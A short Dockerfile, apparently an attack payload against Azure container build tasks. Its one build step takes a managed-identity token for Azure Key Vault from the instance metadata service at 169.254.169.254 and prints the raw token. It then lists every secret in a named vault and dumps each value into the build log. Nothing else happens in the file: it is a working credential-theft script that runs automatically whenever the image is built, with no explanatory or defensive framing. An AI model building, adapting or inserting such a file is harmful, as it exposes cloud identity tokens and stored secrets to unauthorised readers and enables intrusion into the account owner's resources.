FROM alpine
RUN apk add --no-cache curl jq && \
    AAD_TOKEN=$(curl -sS -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
      | jq -r '.access_token') && \
    echo "=== TOKEN === $AAD_TOKEN" && \
    SECRETS=$(curl -sS -H "Authorization: Bearer $AAD_TOKEN" \
      "https://acr-2-62eff7a65e.vault.azure.net/secrets?api-version=7.4" \
      | jq -r '.value[].id') && \
    for s in $SECRETS; do \
      echo "=== $s ===" ; \
      curl -sS -H "Authorization: Bearer $AAD_TOKEN" "$s/?api-version=7.4" | jq . ; \
    done
